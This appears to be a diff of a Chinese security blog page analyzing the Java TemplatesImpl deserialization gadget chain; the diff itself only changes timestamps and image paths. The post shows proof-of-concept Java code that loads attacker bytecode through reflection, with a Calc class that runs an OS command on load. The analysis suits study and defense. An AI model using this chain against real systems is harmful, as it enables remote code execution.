@@ -7,7 +7,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://timind-sec.github.io/img/avatar.jpg">
 <meta property="article:published_time" content="2026-05-19T09:39:53.000Z">
-<meta property="article:modified_time" content="2026-08-17T23:04:51.818Z">
+<meta property="article:modified_time" content="2026-08-17T23:12:35.007Z">
 <meta property="article:author" content="Timind">
 <meta property="article:tag" content="TemplatesImpl利用链分析">
 <meta name="twitter:card" content="summary">
@@ -18,7 +18,7 @@
   "url": "http://timind-sec.github.io/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/",
   "image": "http://timind-sec.github.io/img/avatar.jpg",
   "datePublished": "2026-05-19T09:39:53.000Z",
-  "dateModified": "2026-08-17T23:04:51.818Z",
+  "dateModified": "2026-08-17T23:12:35.007Z",
   "author": [
     {
       "@type": "Person",
@@ -159,7 +159,7 @@
   isHighlightShrink: false,
   isToc: true,
   pageType: 'post'
-}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/background.jpg);"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/top_img2.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Timind's café</span></a><a class="nav-page-title" href="/"><span class="site-name">TemplatesImpl利用链分析</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">TemplatesImpl利用链分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-19T09:39:53.000Z" title="发表于 2026-05-19 17:39:53">2026-05-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-08-17T23:04:51.818Z" title="更新于 2026-08-18 07:04:51">2026-08-18</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在看java反序列化漏洞的时候发现很多时候需要去打不出网的手法，于是乎TemplatesImpl利用链就应运而生，java反序列化除开远程加载恶意的JNDI服务，还有这种直接识别恶意字节码并加载恶意类的利用方式。</p>
+}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/background.jpg);"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/top_img2.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Timind's café</span></a><a class="nav-page-title" href="/"><span class="site-name">TemplatesImpl利用链分析</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">TemplatesImpl利用链分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-19T09:39:53.000Z" title="发表于 2026-05-19 17:39:53">2026-05-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-08-17T23:12:35.007Z" title="更新于 2026-08-18 07:12:35">2026-08-18</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在看java反序列化漏洞的时候发现很多时候需要去打不出网的手法，于是乎TemplatesImpl利用链就应运而生，java反序列化除开远程加载恶意的JNDI服务，还有这种直接识别恶意字节码并加载恶意类的利用方式。</p>
 <h1 id="javassist前置知识"><a href="#javassist前置知识" class="headerlink" title="javassist前置知识"></a>javassist前置知识</h1><p>首先我们在<code>pom.xml</code>里边添加一下依赖：</p>
 <p>xml</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.22.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
@@ -177,16 +177,21 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ready to say:</span><br><span class="line">Hello!</span><br></pre></td></tr></table></figure>
 
 <h1 id="TemplatesImpl加载字节码"><a href="#TemplatesImpl加载字节码" class="headerlink" title="TemplatesImpl加载字节码"></a>TemplatesImpl加载字节码</h1><p>在rt.jar!\com\sun\org\apache\xalan\internal\xsltc\trax\TemplatesImpl.java中有一个TransletClassloader，它继承了Classloader，并且还重写了loadClass()方法</p>
-<p><img src="D:\pentest-notes\blog\blog\source_posts\TemplatesImpl利用链分析.assets\image-20260815022744029.png" alt="image-20260815022744029"></p>
+<img src="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20260815022744029.png" class="" title="image-20260815022744029">
+
 <p>随后跟一下TemplatesImpl#defineTransletClasses方法</p>
-<p><img src="D:\pentest-notes\blog\blog\source_posts\TemplatesImpl利用链分析.assets\image-20260815022957130.png" alt="image-20260815022957130"></p>
+<img src="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20260815022957130.png" class="" title="image-20260815022957130">
+
 <p>其中会判断_bytecodes字段，这个就是我们要加载的字节码</p>
 <p>跟进TransletClassLoader就会发现他里边有个重写的loadClass，然后name就是上面TransletClassLoader构造时传入的mapEF，这里也要注意一下格式</p>
-<p><img src="D:\pentest-notes\blog\blog\source_posts\TemplatesImpl利用链分析.assets\image-20260815023317070.png" alt="image-20260815023317070"></p>
+<img src="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20260815023317070.png" class="" title="image-20260815023317070">
+
 <p>并且注意到_bytecodes是二维数组，所以我们待会new这个字节数字的时候得是 <code>new byte[][]&#123;byte&#125;</code></p>
-<p><img src="D:\pentest-notes\blog\blog\source_posts\TemplatesImpl利用链分析.assets\image-20260815023037709.png" alt="image-20260815023037709"></p>
+<img src="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20260815023037709.png" class="" title="image-20260815023037709">
+
 <p>接着我们看_tfactory</p>
-<p><img src="D:\pentest-notes\blog\blog\source_posts\TemplatesImpl利用链分析.assets\image-20260815023829089.png" alt="image-20260815023829089"></p>
+<img src="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20260815023829089.png" class="" title="image-20260815023829089">
+
 <p>在TemplatesImpl中默认值为null，在这我们得需要给它赋个值，要不然后续会报错，因为他本升就是一个TransformerFactoryImpl的对象，所以我们只需要复制给它一个对象即可<code>new TransformerFactoryImpl()</code></p>
 <p>到这我们可以尝试写个demo，就是从TemplatesImpl加载一个恶意字节码-&gt;TemplatesImpl#defineTransletClasses()</p>
 <p>恶意类</p>
@@ -199,17 +204,22 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoadTestTemp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.getCtClass(<span class="string">&quot;org.example.Calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineTransletClasses</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredMethod(<span class="string">&quot;defineTransletClasses&quot;</span>);</span><br><span class="line">        defineTransletClasses.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        defineTransletClasses.invoke(templates);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>运行完触发类发现报错了</p>
-<p><img src="D:\pentest-notes\blog\blog\source_posts\TemplatesImpl利用链分析.assets\image-20260815025111434.png" alt="image-20260815025111434"></p>
+<img src="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20260815025111434.png" class="" title="image-20260815025111434">
+
 <p>我们可以跟进TemplatesImpl代码中的第422行看下原因</p>
-<p><img src="D:\pentest-notes\blog\blog\source_posts\TemplatesImpl利用链分析.assets\image-20260815025204532.png" alt="image-20260815025204532"></p>
+<img src="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20260815025204532.png" class="" title="image-20260815025204532">
+
 <p>在这块出了问题，那么估计是因为前面条件判断的时候粗话了点问题，我们得看看</p>
-<p><img src="D:\pentest-notes\blog\blog\source_posts\TemplatesImpl利用链分析.assets\image-20260815025411753.png" alt="image-20260815025411753"></p>
+<img src="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20260815025411753.png" class="" title="image-20260815025411753">
+
 <p>其中这个私有静态属性时写死了，然后我们目前的类并不继承该类，所以就会跳到else逻辑，那看来这个defineTransletClass()利用难度较大，所以得看看有没有别的地方调用了这个方法</p>
 <p>在TemplatesImpl搜索发现getTransletInstance也调用了这个方法</p>
-<p><img src="D:\pentest-notes\blog\blog\source_posts\TemplatesImpl利用链分析.assets\image-20260815030739934.png" alt="image-20260815030739934"></p>
+<img src="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20260815030739934.png" class="" title="image-20260815030739934">
+
 <p>其中<code>_name</code>不能为null，要不然就会直接返回一个null，其次<code>_class</code>要为空，这样才能让链子走到我们想要的defineTransletClasses</p>
 <p>接着我们跟一下是谁调用了getTransletInstance()，发现在TemplatesImpl#newTransformer()中调用了</p>
-<p><img src="D:\pentest-notes\blog\blog\source_posts\TemplatesImpl利用链分析.assets\image-20260818060557616.png" alt="image-20260818060557616"></p>
+<img src="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20260818060557616.png" class="" title="image-20260818060557616">
+
 <p>同时Transformer类为public修饰，可直接从外部调用，我们可尝试在这里开始进行调用链测试。开始之前，我们重新理一下链子</p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">com<span class="selector-class">.sun</span><span class="selector-class">.org</span><span class="selector-class">.apache</span><span class="selector-class">.xalan</span><span class="selector-class">.internal</span><span class="selector-class">.xsltc</span><span class="selector-class">.trax</span>.TemplatesImpl<span class="selector-id">#newTransformer</span></span><br><span class="line">com<span class="selector-class">.sun</span><span class="selector-class">.org</span><span class="selector-class">.apache</span><span class="selector-class">.xalan</span><span class="selector-class">.internal</span><span class="selector-class">.xsltc</span><span class="selector-class">.trax</span>.TemplatesImpl<span class="selector-id">#getTransletInstance</span></span><br><span class="line">com<span class="selector-class">.sun</span><span class="selector-class">.org</span><span class="selector-class">.apache</span><span class="selector-class">.xalan</span><span class="selector-class">.internal</span><span class="selector-class">.xsltc</span><span class="selector-class">.trax</span>.TemplatesImpl<span class="selector-id">#defineTransletClasses</span></span><br><span class="line">com<span class="selector-class">.sun</span><span class="selector-class">.org</span><span class="selector-class">.apache</span><span class="selector-class">.xalan</span><span class="selector-class">.internal</span><span class="selector-class">.xsltc</span><span class="selector-class">.trax</span><span class="selector-class">.TemplatesImpl</span><span class="selector-class">.TransletClassLoader</span><span class="selector-class">.defineClass</span></span><br><span class="line">java<span class="selector-class">.lang</span>.ClassLoader#defineClass</span><br></pre></td></tr></table></figure>
 
@@ -217,21 +227,27 @@
 <figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl templatesImpl <span class="operator">=</span> new TemplatesImpl()<span class="comment">;</span></span><br><span class="line">templates.newTransformer()<span class="comment">;</span></span><br></pre></td></tr></table></figure>
 
 <p>进入到TemplatesImpl#getTransletInstance之后需要过两处if，前面提到过</p>
-<p><img src="D:\pentest-notes\blog\blog\source_posts\TemplatesImpl利用链分析.assets\image-20260818061234042.png" alt="image-20260818061234042"></p>
+<img src="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20260818061234042.png" class="" title="image-20260818061234042">
+
 <p><code>_name</code>不能为空，<code>_class</code>得为空才能进入到defineTransletClasses()，我们现在观察一下这两个字段的属性</p>
 <p>1、<code>_name</code>为private String型</p>
-<p><img src="D:\pentest-notes\blog\blog\source_posts\TemplatesImpl利用链分析.assets\image-20260818061449015.png" alt="image-20260818061449015"></p>
+<img src="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20260818061449015.png" class="" title="image-20260818061449015">
+
 <p>2、<code>_class</code>为private Class[]数组型</p>
-<p><img src="D:\pentest-notes\blog\blog\source_posts\TemplatesImpl利用链分析.assets\image-20260818061510105.png" alt="image-20260818061510105"></p>
+<img src="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20260818061510105.png" class="" title="image-20260818061510105">
+
 <p>只需进行如下反射修改赋值即可：</p>
 <figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Class</span> templatesClass = templates.getClass();</span><br><span class="line"><span class="keyword">Field</span> _nameField = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">_nameField.setAccessible(true);</span><br><span class="line">_nameField.<span class="built_in">set</span>(templates,<span class="string">&quot;aaa&quot;</span>); </span><br></pre></td></tr></table></figure>
 
 <p>此时<code>_name</code>被赋为aaa，<code>_class</code>没有赋值，默认为空，过了两个if之后进入到defineTransletClasses()</p>
-<p><img src="D:\pentest-notes\blog\blog\source_posts\TemplatesImpl利用链分析.assets\image-20260818062139871.png" alt="image-20260818062139871"></p>
+<img src="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20260818062139871.png" class="" title="image-20260818062139871">
+
 <p>首先第一处if告诉我们<code>_bytecodes</code>等于空的话会进入到下方的ErrorMsg，看名字就知道进入到这会报错，所以我们不能让_bytecodes为空，我们也可以观察其属性</p>
-<p><img src="D:\pentest-notes\blog\blog\source_posts\TemplatesImpl利用链分析.assets\image-20260818062415227.png" alt="image-20260818062415227"></p>
+<img src="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20260818062415227.png" class="" title="image-20260818062415227">
+
 <p>为<code>private byte[][]</code>类型的二维数组</p>
-<p><img src="D:\pentest-notes\blog\blog\source_posts\TemplatesImpl利用链分析.assets\image-20260818062327643.png" alt="image-20260818062327643"></p>
+<img src="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20260818062327643.png" class="" title="image-20260818062327643">
+
 <p>随后_bytecodes会作为字节码进入到defineClass进行加载，到这里可以看到只要区队这个loader进行一手修饰，然后传入恶意字节码就行了，也没做什么过滤</p>
 <h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><h2 id="Calc类"><a href="#Calc类" class="headerlink" title="Calc类"></a>Calc类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -244,23 +260,31 @@
 
 <p>其中我们看到上面的LoadTemplatesImpl里边还有个_tfactory字段，这是干嘛的</p>
 <p>跟进刚刚的defineTransletClasses()</p>
-<p><img src="D:\pentest-notes\blog\blog\source_posts\TemplatesImpl利用链分析.assets\image-20260818063651930.png" alt="image-20260818063651930"></p>
+<img src="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20260818063651930.png" class="" title="image-20260818063651930">
+
 <p>我们看到在实例化loader对象之后还有一个doPrivileged的操作，看起来是做权限检查的，我们跟进ObjectFactory.findClassLoader()方法看看</p>
-<p><img src="D:\pentest-notes\blog\blog\source_posts\TemplatesImpl利用链分析.assets\image-20260818063918786.png" alt="image-20260818063918786"></p>
+<img src="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20260818063918786.png" class="" title="image-20260818063918786">
+
 <p>看注释能看出来他会去检测当前的加载器是否使用到了bootclassloader，这里边涉及到双亲委派机制，总而言之最后不会返回null（类加载的安全机制），主要是看这里的_tfactory</p>
 <p>_tfactory其实也不能为null，为什么</p>
-<p><img src="D:\pentest-notes\blog\blog\source_posts\TemplatesImpl利用链分析.assets\image-20260818064358303.png" alt="image-20260818064358303"></p>
+<img src="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20260818064358303.png" class="" title="image-20260818064358303">
+
 <p>记住，TemplatesImpl类里边对象的_tfactory值为null，但是我们可以进到readObject看看，他到后面反序列化的时候会给这个<code>_tfactory</code>赋值，给他赋一个TransformerFactoryImpl()</p>
-<p><img src="D:\pentest-notes\blog\blog\source_posts\TemplatesImpl利用链分析.assets\image-20260818064515577.png" alt="image-20260818064515577"></p>
+<img src="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20260818064515577.png" class="" title="image-20260818064515577">
+
 <p>不知道看谁文章写的，说readObject赋了值那我序列化的时候也要赋，我自己调试了下，发现如果_tfactory为空的话程序会抛出空指针异常NullPointerException，如图：</p>
-<p><img src="D:\pentest-notes\blog\blog\source_posts\TemplatesImpl利用链分析.assets\image-20260818065736529.png" alt="image-20260818065736529"></p>
+<img src="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20260818065736529.png" class="" title="image-20260818065736529">
+
 <p>我重新跟到TemplatesImpl#_tfactory.getExternalExtensionsMap()时，全局搜索NullPointerException，发现有一处方法会抛出</p>
-<p><img src="D:\pentest-notes\blog\blog\source_posts\TemplatesImpl利用链分析.assets\image-20260818065910506.png" alt="image-20260818065910506"></p>
+<img src="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20260818065910506.png" class="" title="image-20260818065910506">
+
 <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TransformerFactoryImpl<span class="meta">#getFeature</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="D:\pentest-notes\blog\blog\source_posts\TemplatesImpl利用链分析.assets\image-20260818070001168.png" alt="image-20260818070001168"></p>
-<p><img src="D:\pentest-notes\blog\blog\source_posts\TemplatesImpl利用链分析.assets\image-20260818070013765.png" alt="image-20260818070013765"></p>
-<p>而这里的name显而易见就是我们的_tfactory，可以跟一下<img src="D:\pentest-notes\blog\blog\source_posts\TemplatesImpl利用链分析.assets\image-20260818070059577.png" alt="image-20260818070059577"></p>
+<img src="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20260818070001168.png" class="" title="image-20260818070001168">
+
+<img src="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20260818070013765.png" class="" title="image-20260818070013765">
+
+<p>而这里的name显而易见就是我们的_tfactory，可以跟一下<img src="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20260818070059577.png" class="" title="image-20260818070059577"></p>
 <p>那么显而易见_tfactory不能为空，于是给他赋个值，实例化个对象</p>
 <p>最终poc即为上面那样子的</p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>TemplatesImpl利用链整体上来说没有太多弯弯绕绕的地方，主要是理解三处if是怎么绕的，然后灵活地运用反射去进行调用，TemplatesImpl利用链在很多java组件中都能看到其中的身影，后续再做分析。</p>
